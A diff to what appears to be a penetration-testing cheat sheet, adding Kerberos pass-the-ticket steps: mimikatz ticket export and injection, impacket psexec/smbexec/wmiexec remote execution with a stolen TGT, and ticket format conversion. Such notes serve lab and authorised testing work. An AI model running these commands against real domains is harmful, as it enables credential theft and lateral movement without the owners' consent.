@@ -299,6 +299,18 @@ impacket-mssqlclient -k dc.sequel.htb
 ```
 sekurlsa::tickets /export (export all kirbi files)
 kerberos::ptt [0;3e7]-0-0-40a00000-ted@krbtgt-web01.exam.com-exam.com.kirbi (load into memory)
+
+# Set the TGT for impacket use
+export KRB5CCNAME=<TGT_ccache_file>
+
+# Execute remote commands with any of the following by using the TGT
+python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+
+# To convert tickets between Linux/Windows format with ticket_converter.py:
+impacket-ticket_converter ticket.kirbi ticket.ccache
+impacket-ticket_converter ticket.ccache ticket.kirbi
 ```
 ### Overpass-the-hash
 >transfer hash to TGT ticket file, then authenticate as that user to move laterally
